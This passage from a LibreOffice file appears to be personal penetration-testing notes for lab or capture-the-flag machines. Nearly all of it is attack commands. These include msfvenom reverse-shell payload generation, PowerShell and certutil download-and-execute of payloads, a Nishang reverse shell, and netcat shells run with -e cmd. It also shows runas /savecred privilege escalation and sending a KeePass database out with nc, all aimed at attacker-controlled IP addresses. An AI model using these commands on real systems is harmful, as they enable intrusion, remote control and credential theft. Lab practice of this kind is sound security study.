10.10.14.6<text:line-break/><text:line-break/>run<text:line-break/><text:soft-page-break/>run post/multi/recon/local_exploit_suggester<text:line-break/>background<text:line-break/>*********** use exploit/local/EXPLPOIT-SUGGESTED************<text:line-break/>set lport 9004<text:line-break/>set lhost 10.10.14.6<text:line-break/>run <text:line-break/>getuid<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Transfer Files Using FTP Service</text:span><text:line-break/><text:line-break/>echo open 10.10.14.19&gt;ftp_commands.txt&amp;echo anonymous&gt;&gt;ftp_commands.txt&amp;echo password&gt;&gt;ftp_commands.txt&amp;echo binary&gt;&gt;ftp_commands.txt&amp;echo get ms15.exe&gt;&gt;ftp_commands.txt&amp;echo bye&gt;&gt;ftp_commands.txt&amp;ftp -s:ftp_commands.txt <text:line-break/><text:line-break/>python -m pyftpdlib -p 21<text:line-break/><text:line-break/>Transfer Files &amp; Getting Root Shell<text:line-break/><text:line-break/>powershell -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.12.61:8001/shell.exe', 'shell.exe')<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Create Exploit:</text:span><text:line-break/><text:line-break/>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.12.61 LPORT=31337 -e x86/shikata_ga_nai -f exe -o shell.exe<text:line-break/><text:line-break/><text:line-break/>python -m SimplerHTTPServer 8001<text:line-break/><text:line-break/>dir | findstr shell<text:line-break/><text:line-break/>runas /user:Administrator /noprofile /savecred "cmd.exe /c shell.exe<text:line-break/><text:line-break/>Transfer Files &amp; Getting Root Shell Building the Payload: /usr/share/nishang/Shells/Invoke-PowershellTcp.ps1   already available on kali, if not Download from here. <text:line-break/><text:line-break/><text:line-break/>echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 9001 &gt;&gt; Invoke-PowershellTcp.ps1<text:line-break/><text:line-break/>python -m SimpleHTTPServer 8001  <text:line-break/><text:line-break/><text:span text:style-name="T2">Transferring the Payload:</text:span><text:line-break/><text:line-break/>cd C:\Users\security\AppData\Local\Temp\<text:line-break/><text:line-break/>certutil -f split -urlcache http://10.10.10.10:8001/Invoke_powershellTcp.ps1<text:line-break/><text:soft-page-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Run As Admin:</text:span><text:line-break/>runas /user:ACCESS\administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Users\security\AppData\Local\Temp\Invoke-PowerShellTcp.ps1"<text:line-break/><text:line-break/>nc nvlp 9001<text:line-break/><text:line-break/><text:span text:style-name="T2"><text:line-break/><text:line-break/></text:span><text:span text:style-name="T3">Useful Powershell Commands </text:span><text:line-break/><text:line-break/><text:span text:style-name="T2">Download a File using Power Shell:</text:span><text:line-break/><text:line-break/>powershell -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.19:8001/41015.exe', 'shell.exe')<text:line-break/><text:line-break/><text:span text:style-name="T2">Download a File Using Power Shell:</text:span><text:line-break/><text:line-break/>nc.exe 10.10.10.10 8002 &lt; CEH.kdbx<text:line-break/><text:line-break/><text:span text:style-name="T2">Execute a Command in Java Shell</text:span><text:line-break/><text:line-break/>def cmd = "cmd.exe /c dir".execute();<text:line-break/>println("${cmd.text}");<text:line-break/><text:line-break/><text:span text:style-name="T2">Execute a Command in Java Shell</text:span><text:line-break/><text:line-break/>println "cmd.exe /c dir".execute().text<text:line-break/><text:line-break/><text:span text:style-name="T2">Upload a file using Power shell: in a java shell</text:span><text:line-break/><text:line-break/>def process = "powershell -command Invoke-WebRequest 'http://10.10.10.10:8001/nc.exe' -OutFile nc.exe".execute();<text:line-break/>println("${process.text}");<text:line-break/><text:line-break/><text:span text:style-name="T2">Get a Reverse Shell using Powershell</text:span><text:line-break/><text:line-break/>def process = "powershell -command ./nc.exe 10.10.10.10 9001 -e cmd.exe".execute(); <text:line-break/>println("${process.text}");<text:line-break/><text:line-break/>nc.exe should be in the same directory; use the above command to download it. <text:line-break/><text:line-break/><text:span text:style-name="T2">Check for Hidden Files</text:span><text:line-break/><text:line-break/> get-content .\root.txt -stream *<text:line-break/><text:line-break/> get-content .\root.txt -stream root.txt<text:line-break/><text:soft-page-break/><text:line-break/><text:line-break/><text:span text:style-name="T2">Download and Execute Powershell Script on Victim Machine</text:span><text:line-break/><text:line-break/>Powershell IEX(new-object Net.WebClient).Downloadstring(\"http://10.10.14.35:8001/revs.ps1\")<text:line-break/><text:line-break/>python -m SimpleHTTPServer 8001<text:line-break/><text:line-break/>nc -nvlp 9001<text:line-break/><text:line-break/>#Reverse Shell Used is Nishang Invoke-Powershell-TCP.ps1 <text:line-break/><text:line-break/><text:span text:style-name="T2">Download and Execute Powershell Script on Victim Machine </text:span><text:line-break/>- Method II <text:line-break/><text:line-break/>powershell Invoke-WebRequest -Uri 10.10.14.35:8001/nc.exe -OutFile C:\Users\Administrator\downloads\nc.exe <text:line-break/><text:line-break/>python -m SimpleHTTPServer 8001<text:line-break/><text:line-break/>C:\users\administrator\downloads\nc.exe -e cmd 10.10.14.35 9001 <text:line-break/><text:line-break/>nc -nvlp 90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14:22:23.072581334</meta:creation-date>
    <dc:date>2021-02-09T14:24:25.119781706</dc:date>
    <meta:editing-duration>PT2M2S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="17" meta:paragraph-count="1" meta:word-count="2295" meta:character-count="20954" meta:non-whitespace-character-count="18082"/>
    <meta:generator>LibreOffice/6.1.5.2$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>